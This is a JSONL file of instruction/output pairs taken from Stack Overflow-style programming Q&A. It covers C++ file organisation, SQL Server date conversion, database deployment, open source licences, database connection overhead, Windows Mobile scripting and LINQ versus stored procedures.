{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "G'day,\nMost places where I have worked have folowed this practice. I've actually written coding standards for BAE (Aust.) along with the reasons why instead of just carving something in stone with no real justification.\nConcerning your question about source files, it's not so much time to compile but more an issue of being able to find the relevant code snippet in the first place. Not everyone is using an IDE. And knowing that you just look for MyClass.h and MyClass.cpp really saves time compared to running \"grep MyClass *.(h|cpp)\" over a bunch of files and then filtering out the #include MyClass.h statements...\nMind you there are work-arounds for the impact of large numbers of source files on compile times. See Large Scale C++ Software Design by John Lakos for an interesting discussion.\nYou might also like to read Code Complete by Steve McConnell for an excellent chapter on coding guidelines. Actualy, this book is a great read that I keep coming back to regularly\ncheers,\nRob"}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "How about writing a cursor to loop through the contents, attempting the cast for each entry?When an error occurs, output the primary key or other identifying details for the problem record.\n  I can't think of a set-based way to do this.\n\nNot totally setbased but if only 3 rows out of 1 million are bad it will save you a lot of time\nselect * into BadDates\nfrom Yourtable\nwhere isdate(lastUpdate) = 0\n\nselect * into GoodDates\nfrom Yourtable\nwhere isdate(lastUpdate) = 1\n\nthen just look at the BadDates table and fix that"}
{"instruction": "I have a large table with 1 million+ records. Unfortunately, the person who created the table decided to put dates in a varchar(50) field.\nI need to do a simple date comparison -\ndatediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\nBut it fails on the convert():\nConversion failed when converting datetime from character string.\n\nApparently there is something in that field it doesn't like, and since there are so many records, I can't tell just by looking at it. How can I properly sanitize the entire date field so it does not fail on the convert()? Here is what I have now:\nselect count(*)\nfrom MyTable\nwhere\n    isdate(lastUpdate) > 0\n    and datediff(dd, convert(datetime, lastUpdate, 100), getDate()) < 31\n\n\n@SQLMenace\nI'm not concerned about performance in this case. This is going to be a one time query. Changing the table to a datetime field is not an option.\n@Jon Limjap\nI've tried adding the third argument, and it makes no difference.\n\n@SQLMenace\n\nThe problem is most likely how the data is stored, there are only two safe formats; ISO YYYYMMDD; ISO 8601 yyyy-mm-dd Thh:mm:ss:mmm (no spaces)\n\nWouldn't the isdate() check take care of this?\nI don't have a need for 100% accuracy. I just want to get most of the records that are from the last 30 days.\n\n@SQLMenace\nselect isdate('20080131') -- returns 1\nselect isdate('01312008') -- returns 0\n\n\n@Brian Schkerke\n\nPlace the CASE and ISDATE inside the CONVERT() function.\n\nThanks! That did it.", "output": "The ISDATE() would take care of the rows which were not formatted properly if it were indeed being executed first.  However, if you look at the execution plan you'll probably find that the DATEDIFF predicate is being applied first - thus the cause of your pain.\nIf you're using SQL Server Management Studio hit CTRL+L to view the estimated execution plan for a particular query.\nRemember, SQL isn't a procedural language and short circuiting logic may work, but only if you're careful in how you apply it."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "I will have to agree with Greg: make up an attribute for it. \nAnd if you're really serious, maybe find a way to figure out if the constructor is being accessed by anything other than XMLSerializer and throw an exception if it is."}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "The term here is translation unit and you really want to (if possible) have one class per translation unit ie, one class implementation per .cpp file, with a corresponding .h file of the same name.\nIt's usually more efficient (from a compile/link) standpoint to do things this way, especially if you're doing things like incremental link and so forth. The idea being, translation units are isolated such that, when one translation unit changes, you don't have to rebuild a lot of stuff, as you would have to if you started lumping many abstractions into a single translation unit.\nAlso you'll find many errors/diagnostics are reported via file name (\"Error in Myclass.cpp, line 22\") and it helps if there's a one-to-one correspondence between files and classes. (Or I suppose you could call it a 2 to 1 correspondence)."}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "In addition to simply being \"clearer\", separating classes into separate files makes it easier for multiple developers not to step on each others toes.  There will be less merging when it comes time to commit changes to your version control tool."}
{"instruction": "So far I have encountered adjacency list, nested sets and nested intervals as models for storing tree structures in a database. I know these well enough and have migrated trees from one to another.\nWhat are other popular models? What are their characteristics? What are good resources (books, web, etc) on this topic?\nI'm not only looking for db storage but would like to expand my knowledge on trees in general. For example, I understand that nested sets/intervals are especially favorable for relational database storage and have asked myself, are they actually a bad choice in other contexts?", "output": "The seminal resource for this are chapters 28-30 of SQL for Smarties.\n(I've recommended this book so much I figure Celko owes me royalties by now!)"}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "If this is for XML serialization and NHibernate, where you want the parameterless constructor to be accessible (as is the case in the example you referenced), then use a private or protected parameterless constructor for serialization, or a protected constructor for NHibernate.  With the protected version, you are opening yourself up to inherited classes being able to call that code.\nIf you don't want code calling a method, don't make it accessible.\nEDIT: To perhaps answer the deeper question, AFAIK the compiler only knows about three attributes: Obsolete, Conditional, and AttributeUsage. To add special handling for other attributes would require modifying the compiler."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "I'd suggest you to use the #error directive.\nAnother pretty unknown attribute that might do the work is the conditional attribute (depending on what you're trying to ahieve)\n[Conditional(\"CONDITION\")] \npublic static void MiMethod(int a, string msg)\n\nwhich will remove the method invocation from the IL code itself if \"MY_CONDITION\" is defined."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "Create an FxCop rule, and add FxCop to your integration build in order to check for this.\nYou'll get warnings, rather than a failing build.  Attributes 'run' at reflection time rather than build time.\nAlternatively (and this is rather nasty) put a compiler directive around the method you don't want to be called. Then your code will break if you call it, but you can set up a build that passes the right compiler directive and doesn't."}
{"instruction": "I have a SQL script that inserts data (via INSERT statements currently numbering in the thousands) One of the columns contains a unique identifier (though not an IDENTITY type, just a plain ol' int) that's actually unique across a few different tables. \nI'd like to add a scalar function to my script that gets the next available ID (i.e. last used ID + 1) but I'm not sure this is possible because there doesn't seem to be a way to use a global or static variable from within a UDF, I can't use a temp table, and I can't update a permanent table from within a function. \nCurrently my script looks like this: \n\n   declare @v_baseID int \n   exec dbo.getNextID @v_baseID out  --sproc to get the next available id\n   --Lots of these - where n is a hardcoded value\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', @v_baseID + n ) \n   exec dbo.UpdateNextID @v_baseID + lastUsedn  --sproc to update the last used id\n\nBut I would like it to look like this: \n\n   --Lots of these\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', getNextID() ) \n\nHardcoding the offset is a pain in the arse, and is error prone.  Packaging it up into a simple scalar function is very appealing, but I'm starting to think it can't be done that way since there doesn't seem to be a way to maintain the offset counter between calls.  Is that right, or is there something I'm missing.  \nWe're using SQL Server 2005 at the moment. \nedits for clarification:\nTwo users hitting it won't happen.  This is an upgrade script that will be run only once, and never concurrently. \nThe actual sproc isn't prefixed with sp_, fixed the example code. \nIn normal usage, we do use an id table and a sproc to get IDs as needed, I was just looking for a cleaner way to do it in this script, which essentially just dumps a bunch of data into the db.", "output": "If you have 2 users hitting it at the same time they will get the same id. Why didn't you use an id table with an identity instead, insert into that and use that as the unique (which is guaranteed) id, this will also perform much faster\n\n\nsp_getNextID \n\n\nnever ever prefix procs with sp_, this has performance implication because the optimizer first checks the master DB to see if that proc exists there and then th local DB, also if MS decide to create a sp_getNextID in a service pack yours will never get executed"}
{"instruction": "I have a project group that contains a project I'm working on as well as some related component and packages. I prefer to keep the database links active during design-time. \nI know how to write the code which would change the database file location, but in this case, I'm just using \".\\data\" instead, for various design-time reasons. Unfortunately, using a relative folder means that Delphi needs to be \"pointing\" to the same folder that the project is in.\nI'd like to be able to force the folder location to a different root, without using the \"Save As\" feature. Does anyone happen to know where the Delphi IDE retrieves that info?", "output": "You can change the location the project compliers and saves the dcu/unit/exe to in Project/Options under the Directories/Conditionals is that what you are looking for? \nI bevile there is also some settings for the DBE in the Tools menu, but I dont have them install at the moment (or i cant find them)"}
{"instruction": "Has anybody managed to get the Android Emulator working behind a proxy which requires authentication?\nI've tried setting the -http-proxy argument to \nhttp://DOMAIN/USERNAME:PASSWORD@IP:PORT\n\nbut am having no success. \nI've tried following the docs to no avail. I've also tried the -verbose-proxy setting but this no longer seems to exist.\nAny pointers?", "output": "I've not used the Android Emulator but I have set the $http_proxy environment variable for perl and wget and a few cygwin tools on windows. That might work for you for android, but the slash in the domain name seems like a potential problem.\nI know I tried having my domain \"GLOBAL\" in there, but ended up taking it out and sticking with: http://$USER:password@www-proxy.company.com:80\nOne problem I run into a lot though is programs that cannot be told to use the proxy for DNS queries too. In cases where they don't I always get a host name not found. I'd like to find a local dns resolver that can use the proxy for all the programs that won't."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I do all my database creation as DDL and then wrap that DDL into a schema maintainence class. I may do various things to create the DDL in the first place but fundamentally I do all the schema maint in code. This also means that if one needs to do non DDL things that don't map well to SQL you can write procedural logic and run it between lumps of DDL/DML.\nMy dbs then have a table which defines the current version so one can code a relatively straightforward set of tests:\n\nDoes the DB exist? If not create it.\nIs the DB the current version? If not then run the methods, in sequence, that bring the schema up to date (you may want to prompt the user to confirm and - ideally - do backups at this point).\n\nFor a single user app I just run this in place, for a web app we currently to lock the user out if the versions don't match and have a stand alone schema maint app we run. For multi-user it will depend on the particular environment.\nThe advantage? Well I have a very high level of confidence that the schema for the apps that use this methodology is consistent across all instances of those applications. Its not perfect, there are issues, but it works...\nThere are some issues when developing in a team environment but that's more or less a given anyway!\nMurph"}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "The two most commonly used licenses that allow what you want are the BSD License and \nMIT License. (see also the full list of licenses considered Open Source by the OSI)."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "The GNU Lesser General Public Licence is also corporate-friendly and quite often used in libraries. It allows for usage of a certain library but modifications to it should be made public."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "As a possible alternative to the BSD license you can also use the Ms-PL license (Microsoft public license). Pretty much the same but (arguably) better worded. Additionally, It's got \u201cMicrosoft\u201d in its name, which screams \u201ccorprate-friendly\u201d like nothing else does. ;-)"}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "By \"corporate\" I tend to think of internal development, programs distributed only to people that are employed by the same company. In that sense, pretty much all free software licences are \"corporate-friendly.\"\nHowever, in terms of distributing closed-source software that contains free software the only big one (off the top of my head) that is excluded is the GPL. You could embed LGPL, BSD, MIT, Artistic licenced code. The \"price\" might be having to give credit, but that would be way cheaper than actually writing and debugging the software.\nThings can get hazy when you consider licences that try to protect trademarks (Mozilla) or the compatibility of a broader range of software (Sun). Your constraints are not always only related to the distribution of the code.\nIn summary, if you're unsure you should consult a lawyer."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "Basically, only the GPL requires that the whole product is GPL, and LGPL implies that the parts specific to that library be open sourced. But, for both, the problem arises only when you distribute the application.\nFor all the other open source licenses, the only common requirement is the publicity (ie. show at some point to the user what open source component / library is used).\nAfter that you have the \"no competing commercial product\" licenses...\nAll in all, the most acknowledged business friendly license are IMHO the Apache License, the Artistic License and the Mozilla Public license. \nFurthermore, even if Creative Commons is not widely used for software development, some options are business friendly.\nEdit: forgot BSD (which is more a license-template than a license) and MIT mentionned by Daniel. It seems to me that their usages are fading away, but there is some license tropism to take in account according to the development language / open source sub-community."}
{"instruction": "What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?", "output": "Ideally I looked for components licensed under the Apache Software License. After that LGPL, BSD and Artistic License are my next preferences."}
{"instruction": "A discussion about Singletons in PHP has me thinking about this issue more and more. Most people instruct that you shouldn't make a bunch of DB connections in one request, and I'm just curious as to what your reasoning is. My first thought is the expense to your script of making that many requests to the DB, but then I counter myself with the question: wouldn't multiple connections make concurrent querying more efficient?\nHow about some answers (with evidence, folks) from some people in the know?", "output": "It is the cost of setting up the connection, transferring the data and then tearing it down.  It will eat up your performance.\nEvidence is harder to come by but consider the following...\nLet's say it takes x microseconds to make a connection. \nNow you want to make several requests and get data back and forth.  Let's say that the difference in transport time is negligable between one connection and many (just ofr the sake of argument).\nNow let's say it takes y microseconds to close the connection.\nOpening one connection will take x+y microseconds of overhead.  Opening many will take n * (x+y).  That will delay your execution."}
{"instruction": "A discussion about Singletons in PHP has me thinking about this issue more and more. Most people instruct that you shouldn't make a bunch of DB connections in one request, and I'm just curious as to what your reasoning is. My first thought is the expense to your script of making that many requests to the DB, but then I counter myself with the question: wouldn't multiple connections make concurrent querying more efficient?\nHow about some answers (with evidence, folks) from some people in the know?", "output": "I would assume that it is because your requests are not being sent asynchronously, since your requests are done iteratively on the server, blocking each time, you have to pay for the overhead of creating a connection each time, when you only have to do it once...\nIn Flex, all web service calls are automatically called asynchronously, so you it is common to see multiple connections, or queued up requests on the same connection.\nAsynchronous requests mitigate the connection cost through faster request / response time...because you cannot easily achieve this in PHP without out some threading, then the performance hit is greater then simply reusing the same connection. \nthat's my 2 cents..."}
{"instruction": "A discussion about Singletons in PHP has me thinking about this issue more and more. Most people instruct that you shouldn't make a bunch of DB connections in one request, and I'm just curious as to what your reasoning is. My first thought is the expense to your script of making that many requests to the DB, but then I counter myself with the question: wouldn't multiple connections make concurrent querying more efficient?\nHow about some answers (with evidence, folks) from some people in the know?", "output": "Setting up a DB connection is usually quite heavy. A lot of things are going on backstage (DNS resolution/TCP connection/Handshake/Authentication/Actual Query).\nI've had an issue once with some weird DNS configuration that made every TCP connection took a few seconds before going up. My login procedure (because of a complex architecture) took 3 different DB connections to complete. With that issue, it was taking forever to log-in. We then refactored the code to make it go through one connection only."}
{"instruction": "A discussion about Singletons in PHP has me thinking about this issue more and more. Most people instruct that you shouldn't make a bunch of DB connections in one request, and I'm just curious as to what your reasoning is. My first thought is the expense to your script of making that many requests to the DB, but then I counter myself with the question: wouldn't multiple connections make concurrent querying more efficient?\nHow about some answers (with evidence, folks) from some people in the know?", "output": "We access Informix from .NET and use multiple connections.  Unless we're starting a transaction on each connection, it often is handled in the connection pool.  I know that's very brand-specific, but most(?) database systems' cilent access will pool connections to the best of its ability.\nAs an aside, we did have a problem with connection count because of cross-database connections.  Informix supports synonyms, so we synonymed the common offenders and the multiple connections were handled server-side, saving a lot in transfer time, connection creation overhead, and (the real crux of our situtation) license fees."}
{"instruction": "A discussion about Singletons in PHP has me thinking about this issue more and more. Most people instruct that you shouldn't make a bunch of DB connections in one request, and I'm just curious as to what your reasoning is. My first thought is the expense to your script of making that many requests to the DB, but then I counter myself with the question: wouldn't multiple connections make concurrent querying more efficient?\nHow about some answers (with evidence, folks) from some people in the know?", "output": "Database connections are a limited resource.  Some DBs have a very low connection limit, and wasting connections is a major problem.  By consuming many connections, you may be blocking others for using the database.\nAdditionally, throwing a ton of extra connections at the DB doesn't help anything unless there are resources on the DB server sitting idle.  If you've got 8 cores and only one is being used to satisfy a query, then sure, making another connection might help.  More likely, though, you are already using all the available cores.  You're also likely hitting the same harddrive for every DB request, and adding additional lock contention.\nIf your DB has anything resembling high utilization, adding extra connections won't help.  That'd be like spawning extra threads in an application with the blind hope that the extra concurrency will make processing faster.  It might in some certain circumstances, but in other cases it'll just slow you down as you thrash the hard drive, waste time task-switching, and introduce synchronization overhead."}
{"instruction": "When opening Adobe Acrobat Pro, whether it be through Applescript or finder, the introductory dialog is shown.  Is there a way to not show this dialog without already having checked the \"Don't Show Again\" option when opening a document using Applescript?  \nPhotoshop and Illustrator Applescript libraries have ways of setting interaction levels and not showing dialogs, but I can't seem to find the option in Acrobat.", "output": "If it's not in the dictionary, probably not."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "[C++]\nI agree with the \"use it when you have to\" brigade. Decorating code unnecessarily with this isn't a great idea because the compiler won't warn you when you forget to do it. This introduces potential confusion for people expecting this to always be there, i.e. they'll have to think about it.\nSo, when would you use it? I've just had a look around some random code and found these examples (I'm not passing judgement on whether these are good things to do or otherwise):\n\nPassing \"yourself\" to a function.\nAssigning \"yourself\" to a pointer or something like that.\nCasting, i.e. up/down casting (safe or otherwise), casting away constness, etc.\nCompiler enforced disambiguation."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I'm using Subsonic's migrations mechanism so I just have a dll with classes in squential order that have 2 methods, up and down. There is a continuous integration/build script hook into nant, so that I can automate the upgrading of my database.\nIts not the best thign in the world, but it beats writing DDL."}
{"instruction": "Is it possible to configure nHibernate to connect to Paradox database (*.db files)?", "output": "Yes, sort of.  \nThere is no support included in the trunk, you need to write your own dialect.  Or you can port the Paradox dialect created for Hibernate."}
{"instruction": "We have a number of users with Windows Mobile 6 and need to apply minor changes. eg. update a registry setting. One option is push and execute an executable file using our device management software.\nI'd like this to be a little more friendly for the admins who are familiar with scripting in VBScript/JScript etc. What are the options for scripting on Windows Mobile devices?", "output": "I work on windows mobile full time and have never really come across a good Windows Mobile scripting implementation unfortunately.  For some reason MS has never seen the need for it.  For example, even though you can actually get a command console on WM, it does not support running batch files, even though all the commands are still there and it would be relatively easy.  There is definitely not a VBScript engine I've ever heard of nor JScript.  There is PythonCE but the WM specific support is minimal and you don't get access to a lot of WM only things.\nAlso, I've done a lot of work with a company called SOTI which has a product called MobiControl that does incorporate a basic scripting engine. Though most of the commands are specific to their system and actually have to be run from a desktop-side management console.\nGiven all of the times I have tried to find a good scripting engine for WM myself you would think I would've just written one ;)\nSo, sorry, but the basic answer is no, there is not a scripting engine available for VB in the context that you specified."}
{"instruction": "We are a small team of 3 developers (2 experienced but new to  this particular business sector) developing a functionally complex product.  We're using Scrum and have a demo at the end of each sprint.  Its clear that the functional team have plenty of ideas but these are not well communicated to the development team and the demo poses more questions than answers. \nHave you any recommendations for improving the the quality of input from the functional people?\nFurther info: I think part of the problem is that there are no specs or  User Stories as such.  Personally I think they need to be writing down some sort of requirements - what sort of things should they be writing down and to what complexity given its an agile process?\nTIA", "output": "Are they participating in the stand-up meetings?\nYou could propose to have a representative at each (or some) of them, to ask them for input before the end of the sprint"}
{"instruction": "We are a small team of 3 developers (2 experienced but new to  this particular business sector) developing a functionally complex product.  We're using Scrum and have a demo at the end of each sprint.  Its clear that the functional team have plenty of ideas but these are not well communicated to the development team and the demo poses more questions than answers. \nHave you any recommendations for improving the the quality of input from the functional people?\nFurther info: I think part of the problem is that there are no specs or  User Stories as such.  Personally I think they need to be writing down some sort of requirements - what sort of things should they be writing down and to what complexity given its an agile process?\nTIA", "output": "Sometimes the easiest way to get input from people is to force it out of them.  My company used SCRUM on a project, and found very quickly that people tend to keep to themselves when they already know what they're doing.  We ended up organizing weekly meetings where team members were required to display something that was learned during the week.  It was forced, but it worked pretty well."}
{"instruction": "We are a small team of 3 developers (2 experienced but new to  this particular business sector) developing a functionally complex product.  We're using Scrum and have a demo at the end of each sprint.  Its clear that the functional team have plenty of ideas but these are not well communicated to the development team and the demo poses more questions than answers. \nHave you any recommendations for improving the the quality of input from the functional people?\nFurther info: I think part of the problem is that there are no specs or  User Stories as such.  Personally I think they need to be writing down some sort of requirements - what sort of things should they be writing down and to what complexity given its an agile process?\nTIA", "output": "Have you tried working with your customer to define / formulate acceptance tests?\nUsing something like Fit to come up with these tests - would result in better specs as well as force the customer to think about what is really required. The icing on the cake is instant-doc-executable specs at the end of this process.\nThat is of course, if your customers are available and open to this approach. Give it a try!\nIf not (and that seems to be the majority - because it is less work) - calendar flash 'em - schedule meetings/telecons every week until they sing like canaries :) +1 to Dana"}
{"instruction": "We have a number of users with Windows Mobile 6 and need to apply minor changes. eg. update a registry setting. One option is push and execute an executable file using our device management software.\nI'd like this to be a little more friendly for the admins who are familiar with scripting in VBScript/JScript etc. What are the options for scripting on Windows Mobile devices?", "output": "The closest thing to a scripting environment on Windows Mobile is the Configuration Service Provider interface.  While it is not a scripting language per se, it does allow one to do a lot of the same type of things such as modify registry settings, copy and delete files and directories, install and uninstall applications and much more.\nMike Calligaro has a great article on how to write scripts and how to get them from your desktop onto the device in various ways.  One of them is certain to work for you."}
{"instruction": "Does anyone have links to documentation or guides on making the decision between REST vs. SOAP? I understand both of these but am looking for some references on the key decision points, eg, security, which may make you lean towards one or the other.", "output": "Google first hit seems pretty comprehensive.\nI think the problem here is there are too many advocates of one or the other, may be better of googling and getting more of a handle of the pro's/con's yourself and making your own decision.\nI know that sounds kinda lame, but ultimately these sort of design decisions fall down to the developer/architect working on it, and 99% of the time, the problem domain will be the deciding factor (or at least it should be), not a guide on the net."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "Some advantages of LINQ over sprocs:\n\nType safety: I think we all understand this.\nAbstraction: This is especially true with LINQ-to-Entities.  This abstraction also allows the framework to add additional improvements that you can easily take advantage of.  PLINQ is an example of adding multi-threading support to LINQ.  Code changes are minimal to add this support.  It would be MUCH harder to do this data access code that simply calls sprocs.\nDebugging support: I can use any .NET debugger to debug the queries.  With sprocs, you cannot easily debug the SQL and that experience is largely tied to your database vendor (MS SQL Server provides a query analyzer, but often that isn't enough).\nVendor agnostic: LINQ works with lots of databases and the number of supported databases will only increase.  Sprocs are not always portable between databases, either because of varying syntax or feature support (if the database supports sprocs at all).\nDeployment: Others have mentioned this already, but it's easier to deploy a single assembly than to deploy a set of sprocs.  This also ties in with #4.\nEasier: You don't have to learn T-SQL to do data access, nor do you have to learn the data access API (e.g. ADO.NET) necessary for calling the sprocs.  This is related to #3 and #4.\n\nSome disadvantages of LINQ vs sprocs:\n\nNetwork traffic: sprocs need only serialize sproc-name and argument data over the wire while LINQ sends the entire query.  This can get really bad if the queries are very complex.  However, LINQ's abstraction allows Microsoft to improve this over time.\nLess flexible: Sprocs can take full advantage of a database's featureset.  LINQ tends to be more generic in it's support.  This is common in any kind of language abstraction (e.g. C# vs assembler).\nRecompiling: If you need to make changes to the way you do data access, you need to recompile, version, and redeploy your assembly.  Sprocs can sometimes allow a DBA to tune the data access routine without a need to redeploy anything.\n\nSecurity and manageability are something that people argue about too.\n\nSecurity: For example, you can protect your sensitive data by restricting access to the tables directly, and put ACLs on the sprocs.  With LINQ, however, you can still restrict direct access  to tables and instead put ACLs on updatable table views to achieve a similar end (assuming your database supports updatable views).  \nManageability: Using views also gives you the advantage of shielding your application non-breaking from schema changes (like table normalization).  You can update the view without requiring your data access code to change.\n\nI used to be a big sproc guy, but I'm starting to lean towards LINQ as a better alternative in general.  If there are some areas where sprocs are clearly better, then I'll probably still write a sproc but access it using LINQ. :)"}
{"instruction": "I have one table \"orders\" with a foreing key \"ProductID\".\nI want to show the orders in a grid with the product name, without LazyLoad for better performance, but I if use DataLoadOptions it retrieves all Product fields, which seams like a overkill.\nIs there a way to retrieve only the Product name in the first query?\nCan I set some attribute in the DBML?\nIn this table says that \"Foreign-key values\" are \"Visible\" in Linq To SQL, but don't know what this means.\nEdit: Changed the title, because I'm not really sure the there is no solution.\nCan't believe no one has the same problem, it is a very common scenario.", "output": "If you select only the columns you want in the linq query, and then call .ToList() on the query, it will be immedietly executed, and will only bring back the columns you are interested in. For example if you do this:\nvar q = from p in dataContext.products select p.ProductName;\nvar results = q.ToList();\n\nYou will get back a list of product names stored in results, and when the query executes on the server it will only bring back the ProductName column."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "I think the only fool proof way would be to extend the Visual Studio (through VSIP) and subscribe to the correct event (maybe in the EnvDTE.BuildEvents) class, and check your code for usage of the constructor, and cancel the build if you detect it."}
